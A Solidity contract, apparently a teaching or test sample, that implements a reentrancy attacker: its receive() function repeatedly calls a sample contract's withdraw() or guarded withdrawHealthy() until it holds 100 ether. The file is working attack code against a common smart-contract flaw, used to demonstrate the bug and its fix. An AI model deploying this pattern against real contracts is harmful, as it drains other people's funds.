// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./ReentrancySample.sol";

contract ReentrancyProxy {
    address public owner;

    mapping(address => uint256) public _balances;

    bool public attackHealthy;

    ReentrancySample public reentrancySample;

    constructor(address _owner, address _sampleAddress) {
        owner = _owner;
        reentrancySample = ReentrancySample(_sampleAddress);
    }

    function deposite() external payable {
        _balances[msg.sender] = msg.value;
    }

    function depositeToSample(uint256 _amount) external payable {
        reentrancySample.deposite{value: _amount}();
    }

    function callWithdrawBalance(address _address) public {
        ReentrancySample(_address).withdraw();
    }

    function callWithdrawBalanceHealthy(address _address) public {
        ReentrancySample(_address).withdrawHealthy();
    }

    function setAttackHealthy(bool _attack) public {
        attackHealthy = _attack;
    }

    receive() external payable {
        if (!attackHealthy) {
            if (address(this).balance < 100 ether) {
                callWithdrawBalance(msg.sender);
            }
        } else {
            if (address(this).balance < 100 ether) {
                callWithdrawBalanceHealthy(msg.sender);
            }
        }
    }

    function etherBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
